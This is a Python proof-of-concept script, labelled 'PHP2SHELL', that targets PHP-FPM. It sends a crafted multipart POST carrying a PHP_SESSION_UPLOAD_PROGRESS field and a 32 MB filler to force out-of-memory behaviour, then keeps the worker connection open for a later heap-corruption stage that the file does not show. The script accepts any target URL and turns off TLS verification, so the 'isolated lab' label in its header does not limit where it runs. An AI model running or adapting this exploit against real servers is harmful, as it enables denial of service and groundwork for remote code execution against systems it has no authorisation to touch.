#!/usr/bin/env python3
"""
PHP2SHELL Research PoC - Memory Corruption Harness
Author: Research Lab / Academic Context
Target: Local PHP-FPM Engine (Isolated Lab Environment Only)
"""

import socket
import ssl
import sys
from urllib.parse import urlparse

def send_oom_trigger(target_url, payload_size=32 * 1024 * 1024):
    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path or '/'

    # Construcción quirúrgica del payload multipart para forzar OOM en upload_progress
    boundary = "----------------WebKitFormBoundary7MA4YWxkTrZu0gW"
    
    body_part1 = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
        f"{'A' * 4096}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"test.bin\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode('utf-8')
    
    # Relleno masivo para alcanzar el límite de memoria configurado
    filler = b'A' * payload_size
    
    body_part2 = (
        f"\r\n--{boundary}--\r\n"
    ).encode('utf-8')

    content_length = len(body_part1) + len(filler) + len(body_part2)

    http_request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Connection: keep-alive\r\n"
        f"Cookie: PHPSESSID=research_session_01\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {content_length}\r\n\r\n"
    ).encode('utf-8') + body_part1 + filler + body_part2

    print(f"[*] Conectando a {host}:{port}...")
    
    if parsed.scheme == 'https':
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((host, port))
    s.sendall(http_request)
    
    response = s.recv(4096)
    print(f"[+] Respuesta inicial recibida ({len(response)} bytes). Worker mantenido en Keep-Alive.")
    
    # Mantenemos el socket abierto para la siguiente fase de interacción con el heap
    return s

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1/index.php"
    sock = send_oom_trigger(target)
    # El socket permanece abierto para pruebas de persistencia de estado global en el worker
